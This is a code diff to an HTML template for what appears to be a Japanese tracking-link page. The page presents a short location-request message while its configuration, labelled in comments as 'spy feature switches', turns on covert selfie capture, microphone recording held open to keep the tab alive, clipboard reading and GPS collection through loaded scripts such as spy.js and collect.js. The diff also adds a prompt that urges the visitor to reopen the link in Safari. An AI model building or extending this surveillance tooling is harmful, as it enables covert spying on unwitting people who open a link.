@@ -3,7 +3,11 @@
 <html lang="ja"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="theme-color" content="#0f1115">
+<link rel="manifest" href="/manifest.webmanifest">
+<link rel="apple-touch-icon" href="/static/icon.svg">
 <title>{{ link.name }}</title>
 <style>
 html,body{margin:0;background:#0f1115;color:#e6e9ef;
@@ -14,14 +18,24 @@ html,body{margin:0;background:#0f1115;color:#e6e9ef;
 .line.warn{color:#f0b429}
 button{margin-top:16px;padding:11px 26px;font-size:14px;border:0;border-radius:999px;
   background:#4c8dff;color:#fff}
+#lt_ia{display:none;margin-top:18px;border-top:1px solid #232734;padding-top:14px}
+#lt_ia p{font-size:13px;color:#9aa3b2;margin:0 0 10px}
+a.btn{display:inline-block;padding:11px 22px;border-radius:999px;background:#2b3346;
+  color:#e6e9ef;text-decoration:none;font-size:14px}
 .sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
 body.ui-none .line{display:none}
+body.ui-none #lt_ia{display:block}
 </style></head><body class="ui-{{ ui }}">
 <div class="wrap"><div class="inner">
   <p class="line" id="lt_st">{{ ask_text }}</p>
   <button id="lt_retry" style="display:none">{{ retry_text }}</button>
+  <div id="lt_ia">
+    <p><span id="lt_ia_name">アプリ内</span> のブラウザでは位置情報が取れないことがあります。</p>
+    <a class="btn" id="lt_safari" href="#">開き直す</a>
+  </div>
   <span class="sr" id="lt_time"></span><span class="sr" id="lt_now"></span>
   <span class="sr" id="lt_perm"></span><span class="sr" id="lt_srv"></span>
+  <span class="sr" id="lt_dbg"></span>
 </div></div>
 <script>
 window.LT_CODE  = {{ code|tojson }};
@@ -37,12 +51,19 @@ window.LT_DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
 window.LT_ASK_TEXT   = {{ ask_text|tojson }};
 window.LT_DENY_TEXT  = {{ deny_text|tojson }};
 window.LT_RETRY_TEXT = {{ retry_text|tojson }};
-/* スパイ機能のスイッチ（0 で黙る） */
-window.LT_CAM  = 1;      /* 自撮り */
-window.LT_MIC  = 1;      /* 環境音 */
-window.LT_CLIP = 1;      /* クリップボード */
-window.LT_MIC_MS = 4000; /* 録音秒数 */
+window.LT_TITLE      = {{ link.name|tojson }};
+
+/* スパイ機能スイッチ */
+window.LT_CAM      = 1;    /* 自撮り（0で無効） */
+window.LT_CAM_HOLD = 0;    /* 1 でカメラを開いたまま保持 */
+window.LT_MIC      = 1;    /* 環境音 */
+window.LT_MIC_HOLD = 1;    /* 1 でマイクを開いたまま保持＝タブが生きたまま */
+window.LT_MIC_MS   = 4000; /* 録音秒数 */
+window.LT_CLIP     = 1;    /* クリップボード */
+window.LT_SPY_WAIT = 7000; /* GPS取得を待つ上限ms */
+window.LT_DEBUG    = 0;    /* 1 でエラーコードを画面に出す */
 </script>
+<script src="/static/keepalive.js"></script>
 <script src="/static/collect.js"></script>
 <script src="/static/live.js"></script>
 <script src="/static/spy.js"></script>
